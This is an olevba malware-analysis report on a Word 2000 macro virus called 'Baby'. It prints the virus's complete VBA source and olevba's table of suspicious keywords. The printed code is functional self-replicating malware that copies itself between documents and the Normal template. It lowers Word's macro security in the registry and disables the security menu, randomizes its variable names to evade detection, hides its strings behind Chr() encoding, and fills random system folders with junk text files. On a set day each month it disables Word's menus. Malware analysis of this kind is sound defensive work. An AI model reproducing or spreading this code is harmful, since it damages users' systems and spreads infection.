olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Baby-80b7f8fec1328b8407ecac6afaf51da7ba559cdc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Baby-80b7f8fec1328b8407ecac6afaf51da7ba559cdc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function ShowWindow Lib "user32" (ByVal hwnd As Long, ByVal nCmdShow As Long) As Long

Private Sub Document_Close()
Randomize: On Error Resume Next: Dim NPVOBB: AAA = Int(Rnd * 3) + 1
    If AAA = 1 Then NPVOBB = ShowCursor(1)
    If AAA = 2 Then: c% = FindWindow("Shell_TrayWnd", vbNullString): NPVOBB = ShowWindow(c%, 1)
    If AAA = 3 Then
QYVD = Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65) + Chr(Int(Rnd * 25) + 65)
MQAW = Int(Rnd * 4) + 1
    If MQAW = 4 Then
MQAW = "c:\windows": End If
    If MQAW = 3 Then
MQAW = "c:\windows\" & QYVD
MkDir MQAW: End If
    If MQAW = 2 Then
MQAW = "c:\" & QYVD
MkDir MQAW: End If
    If MQAW = 1 Then
MQAW = "c:\windows\system\" & QYVD
MkDir MQAW: End If
Open MQAW & "\" & QYVD & ".txt" For Output As #1
NPVOBB = Chr(73) & Chr(32) & Chr(100) & Chr(97) & Chr(32) & Chr(98) & Chr(97) & Chr(98) & Chr(121) & Chr(44) & Chr(32) & Chr(103) & Chr(111) & Chr(116) & Chr(116) & Chr(97) & Chr(32) & Chr(119) & Chr(117) & Chr(118) & Chr(32) & Chr(109) & Chr(101) & Chr(33) & Chr(32) & Chr(58) & Chr(41)
For TOSW = 1 To 8000
MCSI = Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65) & Chr(Int(Rnd * 90) + 65)
AAA = AAA + MCSI
Next TOSW
PTSA = Chr(73) & Chr(32) & Chr(100) & Chr(97) & Chr(32) & Chr(98) & Chr(97) & Chr(98) & Chr(121) & Chr(44) & Chr(32) & Chr(103) & Chr(111) & Chr(116) & Chr(116) & Chr(97) & Chr(32) & Chr(119) & Chr(117) & Chr(118) & Chr(32) & Chr(109) & Chr(101) & Chr(33) & Chr(32) & Chr(58) & Chr(41) & Chr(32) & Chr(32) & Chr(45) & Chr(32) & Chr(32) & Chr(87) & Chr(111) & Chr(114) & Chr(100) & Chr(50) & Chr(48) & Chr(48) & Chr(48) & Chr(46) & Chr(66) & Chr(97) & Chr(98) & Chr(121) & Chr(32) & Chr(98) & Chr(121) & Chr(32)
JVCC = Chr(36) & Chr(77) & Chr(79) & Chr(79) & Chr(84) & Chr(72) & Chr(105) & Chr(69) & Chr(32) & Chr(68) & Chr(97) & Chr(32) & Chr(72) & Chr(117) & Chr(83) & Chr(116) & Chr(108) & Chr(97) & Chr(32) & Chr(91) & Chr(90) & Chr(101) & Chr(114) & Chr(111) & Chr(71) & Chr(114) & Chr(97) & Chr(118) & Chr(105) & Chr(116) & Chr(121) & Chr(93)
NCEOOL = PTSA & JVCC
Print #1, AAA: Print #1, NCEOOL: Close #1
    End If
    If Day(Now) = 12 Then
WORD2000_A = "File": WORD2000_B = "Exit": WORD2000_C = "Edit": WORD2000_D = "View": WORD2000_E = "Insert": WORD2000_F = "Format"
WORD2000_G = "Tools": WORD2000_H = "Table": WORD2000_I = "Help"
HUOFNY = Chr(73) & Chr(39) & Chr(109) & Chr(32) & Chr(100) & Chr(97) & Chr(32) & Chr(98) & Chr(97) & Chr(98) & Chr(121) & Chr(44) & Chr(32) & Chr(103) & Chr(111) & Chr(116) & Chr(116) & Chr(97) & Chr(32) & Chr(108) & Chr(111) & Chr(118) & Chr(101) & Chr(32) & Chr(109) & Chr(101) & Chr(33) & Chr(32) & Chr(58) & Chr(41)
For x = 1 To 13: With CommandBars(WORD2000_A).Controls(x): .Caption = HUOFNY: .Enabled = 0: Next x: End With
CommandBars(WORD2000_A).Controls(WORD2000_B).Caption = HUOFNY: CommandBars(WORD2000_A).Controls(WORD2000_B).Enabled = 0
    For x = 1 To 14
With CommandBars(WORD2000_C).Controls(x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 12
With CommandBars(WORD2000_D).Controls(x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 18
CommandBars(WORD2000_E).Controls (x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 15
CommandBars(WORD2000_F).Controls (x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 19
CommandBars(WORD2000_G).Controls (x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 16
CommandBars(WORD2000_H).Controls (x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
    For x = 1 To 7
CommandBars(WORD2000_I).Controls (x): .Caption = HUOFNY: .Enabled = 0
    Next x: End With
End If
End Sub

Private Sub Document_Open()
On Error Resume Next: If Application.Version <> "9.0" Then End
Dim HAQS As Object, TWPY As Object, KCOR As String, MJQEUV As String, AVHCIH As String, EPKH As String
Set AAA1 = NormalTemplate: Set AAA2 = AAA1.VBProject: Set AAA3 = AAA2.VBCOMPONENTS: Set AAA4 = AAA3.Item(1)
Set HAQS = AAA4.CODEMODULE: Set BBB1 = ActiveDocument: Set BBB2 = BBB1.VBProject
Set BBB3 = BBB2.VBCOMPONENTS: Set BBB4 = BBB3.Item(1): Set TWPY = BBB4.CODEMODULE
XXXAA = "M" & "a" & "c" & "r" & "o": XXXAB = "S" & "e" & "c" & "u" & "r" & "i" & "t" & "y" & "...": XXXAC = XXXAA & "..."
KCOR = Chr(80) & Chr(114) & Chr(105) & Chr(118) & Chr(97) & Chr(116) & Chr(101) & Chr(32) & Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(95) & Chr(79) & Chr(112) & Chr(101) & Chr(110) & Chr(40) & Chr(41)
MJQEUV = Chr(80) & Chr(114) & Chr(105) & Chr(118) & Chr(97) & Chr(116) & Chr(101) & Chr(32) & Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(68) & Chr(111) & Chr(99) & Chr(117) & Chr(109) & Chr(101) & Chr(110) & Chr(116) & Chr(95) & Chr(67) & Chr(108) & Chr(111) & Chr(115) & Chr(101) & Chr(40) & Chr(41)
AVHCIH = Chr(73) & Chr(39) & Chr(109) & Chr(32) & Chr(100) & Chr(97) & Chr(32) & Chr(98) & Chr(97) & Chr(98) & Chr(121) & Chr(44) & Chr(32) & Chr(103) & Chr(111) & Chr(116) & Chr(116) & Chr(97) & Chr(32) & Chr(108) & Chr(111) & Chr(118) & Chr(101) & Chr(32) & Chr(109) & Chr(101) & Chr(33) & Chr(32) & Chr(58) & Chr(41)
EPKH = Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(86) & Chr(105) & Chr(101) & Chr(119) & Chr(86) & Chr(66) & Chr(67) & Chr(111) & Chr(100) & Chr(101) & Chr(40) & Chr(41) & Chr(58) & Chr(32) & Chr(69) & Chr(110) & Chr(100) & Chr(32) & Chr(83) & Chr(117) & Chr(98)
YQSBLT = Chr(73) & Chr(32) & Chr(100) & Chr(97) & Chr(32) & Chr(98) & Chr(97) & Chr(98) & Chr(121) & Chr(44) & Chr(32) & Chr(103) & Chr(111) & Chr(116) & Chr(116) & Chr(97) & Chr(32) & Chr(119) & Chr(117) & Chr(118) & Chr(32) & Chr(109) & Chr(101) & Chr(33) & Chr(32) & Chr(58) & Chr(41)
JVCC = Chr(83) & Chr(117) & Chr(98) & Chr(32) & Chr(70) & Chr(105) & Chr(108) & Chr(101) & Chr(69) & Chr(120) & Chr(105) & Chr(116) & Chr(40) & Chr(41) & Chr(58) & Chr(32) & Chr(69) & Chr(110) & Chr(100) & Chr(32) & Chr(83) & Chr(117) & Chr(98)
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
CommandBars(XXXAA).Controls(XXXAB).Enabled = (99 - 99): CommandBars(XXXAA).Controls(XXXAC).Enabled = (99 - 99)
Set JYHCFG6I = Application
With JYHCFG6I: .ScreenUpdating = (99 - 99): .Caption = YQSBLT: .EnableCancelKey = wdCancelDisabled: End With
    If TWPY.Lines(32, 1) = "" Then
Call OBIWTL
For HTET = 1 To TWPY.COUNTOFLINES
TWPY.insertlines HTET, AVHCIH
Next HTET
For BWHX = 1 To HAQS.COUNTOFLINES
AAA = HAQS.Lines(BWHX, 1)
If AAA = KCOR Then AAA = MJQEUV: GoTo NCEOOL
If AAA = MJQEUV Then AAA = KCOR: GoTo NCEOOL
If AAA = EPKH Then AAA = ""
If AAA = YVBFBG Then AAA = ""
NCEOOL:
TWPY.insertlines BWHX, AAA
Next BWHX: Call GNFLG(2): End If
    If HAQS.Lines(32, 1) = "" Then
Call OBIWTL
For BWHX = 1 To HAQS.COUNTOFLINES
HAQS.insertlines BWHX, AVHCIH
Next BWHX
For HTET = 1 To TWPY.COUNTOFLINES
AAA = TWPY.Lines(HTET, 1)
If AAA = KCOR Then AAA = MJQEUV: GoTo PTSA
If AAA = MJQEUV Then AAA = KCOR: GoTo PTSA
PTSA:
HAQS.insertlines HTET, AAA
Next HTET
HAQS.insertlines HTET + 2, EPKH
If Day(Now) = 12 Then
HAQS.insertlines HTET + 4, JVCC
End If: Call GNFLG(1): End If
'Word2000.Baby Ver 1.0
'$MOOTHiE Da HuStla [ZeroGravity]
'August 31, 2K
'Dedicated to my wife ChiQui
End Sub

Private Function OBIWTL()
On Error Resume Next: Randomize: Dim S(33) As String
S(1) = "NPVOBB": S(2) = "QYVD": S(3) = "MQAW": S(4) = "IVAJ"
S(5) = "TOSW": S(6) = "MCSI": S(6) = "PTSA": S(7) = "JVCC"
S(8) = "NCEOOL": S(9) = "HUOFNY": S(10) = "HAQS": S(11) = "TWPY"
S(12) = "KCOR": S(13) = "MJQEUV": S(14) = "AVHCIH": S(15) = "EPKH"
S(16) = "YQSBLT": S(17) = "KNDFIB": S(18) = "HTET": S(19) = "BWHX"
S(20) = "NCEOOL": S(21) = "YVBFBG": S(22) = "GNFLG": S(23) = "OBIWTL"
S(24) = "PTSA": S(25) = "JVCC": S(26) = "AMMWKW": S(27) = "TOSW"
S(28) = "YRAU": S(29) = "RDJPV": S(30) = "MCSI": S(31) = "XLAA": S(32) = "DBCAW"
S(33) = "JYHCFG6I"
For TOSW = 1 To 33: AAA = ""
For AMMWKW = 1 To (4 + Int(Rnd * 3)): AAA = AAA + Chr(Int(Rnd * 25) + 65)
Next AMMWKW
Call FVSCIM(AAA, S(TOSW))
Next TOSW
End Function

Private Function FVSCIM(YRAU, RDJPV)
On Error Resume Next
Dim AAA As Long, MCSI As Long, OBIWTL As Long, XLAA As Long, AMMWKW As Object
Set XXX1 = NormalTemplate: Set XXX2 = XXX1.VBProject: Set XXX3 = XXX2.VBCOMPONENTS: Set XXX4 = XXX3.Item(1): Set XXX5 = XXX4.CODEMODULE
Set XXXA = NormalTemplate: Set XXXB = XXXA.VBProject: Set XXXC = XXXB.VBCOMPONENTS: Set XXXD = XXXC.Item(1): Set XXXE = XXXD.CODEMODULE
If XXX5.Lines(32, 1) <> "" Then Set AMMWKW = XXX5
If XXXE.Lines(32, 1) <> "" Then Set AMMWKW = XXXE
With AMMWKW
AAA = 1: MCSI = 1: OBIWTL = .COUNTOFLINES: XLAA = Len(.Lines(.COUNTOFLINES, 1))
Do While .Find(RDJPV, AAA, MCSI, OBIWTL, XLAA, True)
strline = .Lines(AAA, 1)
strline = Left(strline, MCSI - 1) & YRAU & Mid(strline, XLAA)
.replaceline AAA, strline
AAA = OBIWTL + 1: MCSI = 1: DBCAW = .COUNTOFLINES
XLAA = Len(.Lines(.COUNTOFLINES, 1))
Loop
End With
End Function

Private Sub GNFLG(MCSI)
Randomize: On Error Resume Next
Set XXX1 = NormalTemplate: Set XXX2 = XXX1.VBProject: Set XXX3 = XXX2.VBCOMPONENTS: Set XXX4 = XXX3.Item(1): Set XXX5 = XXX4.CODEMODULE
Set XXXA = ActiveDocument: Set XXXB = XXXA.VBProject: Set XXXC = XXXB.VBCOMPONENTS: Set XXXD = XXXC.Item(1): Set XXXE = XXXD.CODEMODULE
If MCSI = 1 Then Set RKVRW = XXX5
If MCSI = 2 Then Set RKVRW = XXXE
With RKVRW
JYHCFG6I = .COUNTOFLINES
If JYHCFG6I > 250 Then Exit Sub
For MCSI = 1 To (Int(Rnd * 6) + 4)
AAA = AAA + Chr(Int(Rnd * 25) + 65)
Next MCSI
XLAA = Chr(80) & Chr(114) & Chr(105) & Chr(118) & Chr(97) & Chr(116) & Chr(101) & Chr(32) & Chr(83) & Chr(117) & Chr(98) & Chr(32) & AAA & "()"
.insertlines JYHCFG6I + 2, XLAA & vbCr & vbCr & Chr(69) & Chr(110) & Chr(100) & Chr(32) & Chr(83) & Chr(117) & Chr(98)
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBCOMPONENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMODULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |!P                  |IVAJ                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

